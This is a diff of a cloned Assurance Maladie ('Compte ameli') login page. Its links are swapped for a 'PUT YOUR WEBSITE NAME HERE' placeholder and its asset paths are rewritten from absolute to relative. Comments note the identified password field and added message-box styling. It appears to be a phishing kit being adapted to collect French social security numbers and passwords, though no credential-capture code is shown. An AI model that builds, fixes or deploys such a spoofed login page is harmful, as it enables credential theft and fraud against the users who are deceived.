@@ -8,19 +8,19 @@
     <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <title>Compte ameli - mon espace personnel - Connexion à mon compte</title>
-    <!-- CHANGED to absolute path from root for robustness -->
-    <script type="text/javascript" src="/skins/cnamts/js/utilsdd5c.js?single"></script>
+    <!-- FIXED to relative path for utils.js, now going up one level (out of oauth2) -->
+    <script type="text/javascript" src="../skins/cnamts/js/utilsdd5c.js?single"></script>
     <meta name="description" content="Vos démarches en ligne avec l'Assurance Maladie. Suivi remboursements - Attestations - CEAM - Carte Vitale - Messagerie mail -  Coaching santé">
     <link rel="canonical" href="PUT YOUR WEBSITE NAME HERE">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta name="ac_authstep" content="" />
-    <!-- APPLE ICON - CHANGED to absolute path -->
-    <link rel="apple-touch-icon" href="/skins/cnamts/images/favicons/Favicon.svg"/>
-    <!-- FAVICON - CHANGED to absolute path -->
-    <link rel="icon" href="/skins/cnamts/images/favicons/Favicon.svg"/>
-    <!-- Stylesheet - CHANGED to absolute paths -->
-    <link rel="stylesheet" type="text/css" href="/skins/cnamts/css/used.min.css">
-    <link rel="stylesheet" type="text/css" href="/skins/cnamts/css/webanalyse.min.css">
+    <!-- APPLE ICON - FIXED to relative path -->
+    <link rel="apple-touch-icon" href="../skins/cnamts/images/favicons/Favicon.svg"/>
+    <!-- FAVICON - FIXED to relative path -->
+    <link rel="icon" href="../skins/cnamts/images/favicons/Favicon.svg"/>
+    <!-- Stylesheet - FIXED to relative paths -->
+    <link rel="stylesheet" type="text/css" href="../skins/cnamts/css/used.min.css">
+    <link rel="stylesheet" type="text/css" href="../skins/cnamts/css/webanalyse.min.css">
     <!-- Adding Tailwind CSS for the new message box styles. Original site CSS is still loaded. -->
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
@@ -72,26 +72,26 @@
         }
         .hidden { display: none !important; } /* Use !important to override other styles */
     </style>
-    <!-- JavaScript - CHANGED to absolute paths for robustness -->
-    <script src="/skins/cnamts/js/biblicnam-standalone.min.js" type="text/javascript" defer></script>
-    <script src="/skins/cnamts/js/AideSaisie.js" type="text/javascript" defer></script>
-    <script src="/skins/cnamts/js/refonte_biblicnam.js" type="text/javascript" defer></script>
-    <script src="/skins/cnamts/js/validations.js" type="text/javascript" defer></script>
-    <script src="/skins/cnamts/js/polyfill.js" type="text/javascript" defer></script>
-    <script src="/skins/cnamts/js/placeholders.polyfill.js" type="text/javascript" defer></script>
-    <script src="/skins/cnamts/js/effect.js" type="text/javascript" defer></script>
-    <script src="/skins/cnamts/js/demandeCodeProvisoire.js" type="text/javascript" defer></script>
-    <script src="/skins/cnamts/js/codePersonnel.js" type="text/javascript" defer></script>
-    <script src="/skins/cnamts/js/formatter.js" type="text/javascript" defer></script>
-    <script src="/skins/cnamts/js/ameli-connect.js" type="text/javascript" defer></script>
-    <script src="/skins/cnamts/js/codeOTP.js" type="text/javascript" defer></script>
-    <script src="/skins/cnamts/js/consent.js" type="text/javascript" defer></script>
+    <!-- JavaScript - FIXED to relative paths -->
+    <script src="../skins/cnamts/js/biblicnam-standalone.min.js" type="text/javascript" defer></script>
+    <script src="../skins/cnamts/js/AideSaisie.js" type="text/javascript" defer></script>
+    <script src="../skins/cnamts/js/refonte_biblicnam.js" type="text/javascript" defer></script>
+    <script src="../skins/cnamts/js/validations.js" type="text/javascript" defer></script>
+    <script src="../skins/cnamts/js/polyfill.js" type="text/javascript" defer></script>
+    <script src="../skins/cnamts/js/placeholders.polyfill.js" type="text/javascript" defer></script>
+    <script src="../skins/cnamts/js/effect.js" type="text/javascript" defer></script>
+    <script src="../skins/cnamts/js/demandeCodeProvisoire.js" type="text/javascript" defer></script>
+    <script src="../skins/cnamts/js/codePersonnel.js" type="text/javascript" defer></script>
+    <script src="../skins/cnamts/js/formatter.js" type="text/javascript" defer></script>
+    <script src="../skins/cnamts/js/ameli-connect.js" type="text/javascript" defer></script>
+    <script src="../skins/cnamts/js/codeOTP.js" type="text/javascript" defer></script>
+    <script src="../skins/cnamts/js/consent.js" type="text/javascript" defer></script>
 </head>
 
 <body>
     <header id="tetiere-connexion" class="tetiere-connexion" role="banner">
         <a class="r_lien_image" href="PUT YOUR WEBSITE NAME HERE" title="Logo du r&eacute;gime de l'Assurance Maladie. Cliquez pour acc&eacute;der &agrave; la page de connexion.">
-            <img id="logoam" src="/skins/cnamts/images/logo_general.svg" class="logoam"
+            <img id="logoam" src="../skins/cnamts/images/logo_general.svg" class="logoam"
                 alt="Logo du régime de l'Assurance Maladie">
         </a>
     </header>
@@ -160,7 +160,7 @@
 														</span>
 													</div>
 													<div id="divAideSaisieNir" class="En-savoir-plus hidden">
-														<img id="closeAideNir" tabindex="0" src="/skins/cnamts/images/close_20px.png" alt="Fermer l'aide" title="Fermer l'aide" onclick="hideAideSaisieNir();" onkeydown="navClavierCloseAide(event,'nir');">
+														<img id="closeAideNir" tabindex="0" src="../skins/cnamts/images/close_20px.png" alt="Fermer l'aide" title="Fermer l'aide" onclick="hideAideSaisieNir();" onkeydown="navClavierCloseAide(event,'nir');">
 														<h2 class="title">
 															Aide pour le num&eacute;ro de s&eacute;curit&eacute; sociale
 														</h2>
@@ -174,7 +174,7 @@
 														<span class="zone_champ_saisie">
 															<!-- Identified the password input ID -->
 															<input id="connexioncompte_2connexion_code" maxlength="50" placeholder="Mon mot de passe (ou code provisoire)" size="18" name="password" type="password" class="champ" title="Mon mot de passe (ou code provisoire)" autocomplete="new-password" value="" aria-required="true">
-															<img id="iconeToggleCode" class="iconeToggleCode" tabindex="0" src="/skins/cnamts/images/OeilBarre.png" onclick="afficherMotDePasse($('connexioncompte_2connexion_code'), this, 'Masquer le code', 'Afficher le code');" alt="Oeil">
+															<img id="iconeToggleCode" class="iconeToggleCode" tabindex="0" src="../skins/cnamts/images/OeilBarre.png" onclick="afficherMotDePasse($('connexioncompte_2connexion_code'), this, 'Masquer le code', 'Afficher le code');" alt="Oeil">
 														</span>
 													</div>
 													<!-- AIDE CODE PERSO -->
@@ -213,7 +213,7 @@
         													<input type="hidden" name="lmAuth" value="FRANCECONNECT" />
         													<input type="hidden" name="idp" value="op-franceconnect">
         													<input type="hidden" name="skin" value="cnamts" />
-        													<input type="image" src="/skins/cnamts/images/france-connect.png" border="0" name="submit" alt="FranceConnect" title="S'identifier avec FranceConnect" class="margin-50 france-connect-img" />
+        													<input type="image" src="../skins/cnamts/images/france-connect.png" border="0" name="submit" alt="FranceConnect" title="S'identifier avec FranceConnect" class="margin-50 france-connect-img" />
         												</form>
         											</div>
         											<div class="lien-aide-FRCO">
@@ -240,7 +240,7 @@
 			<div id="pageConsentement" class="cache"></div>
 			<div id="bandeauConsentement" class="cache">
                	<p class="texteBandeau">
-               		L'Assurance Maladie utilise des cookies pour vous permettre une navigation optimale, garantir l'acc&egrave;s s&eacute;curis&eacute; &agrave; vos donn&eacute;es, d&eacute;tecter d'&eacute;ventuels dysfonctionnements ou encore effectuer des mesures d'audience et de performance, analyser votre parcours et am&eacute;liorer la qualit&eacute; des services propos&eacute;s.
+               		L'Assurance Maladie utilise des cookies pour vous permettre une navigation optimale, garantir l'acc&egrave;s s&eacute;curis&eacute; &agrave; vos donn&eacute;es, d&eacute;tecter d'&eacute;ventuels dysfonctionnements ou encore effectuer des mesures d'audience et de performance, analyser votre parcours et am&eacute;liorer la qualit&eacute; des services proposés.
 				</p>
 				<p class="texteBandeau">
 					<a href="PUT YOUR WEBSITE NAME HERE" style="color:#FFFFFF;" tabindex="0" target="_blank">
@@ -271,7 +271,7 @@
                     <ul>
                         <li>
                             <a class="logo-footer" title="Acc&eacute;der &agrave; l'accueil" href="PUT YOUR WEBSITE NAME HERE">
-                                <img src="/skins/cnamts/images/footer_logo_ameli.svg" class="logoam" alt="Logo du régime d'assurance maladie">
+                                <img src="../skins/cnamts/images/footer_logo_ameli.svg" class="logoam" alt="Logo du régime d'assurance maladie">
                             </a>
                         </li>
                         <li>
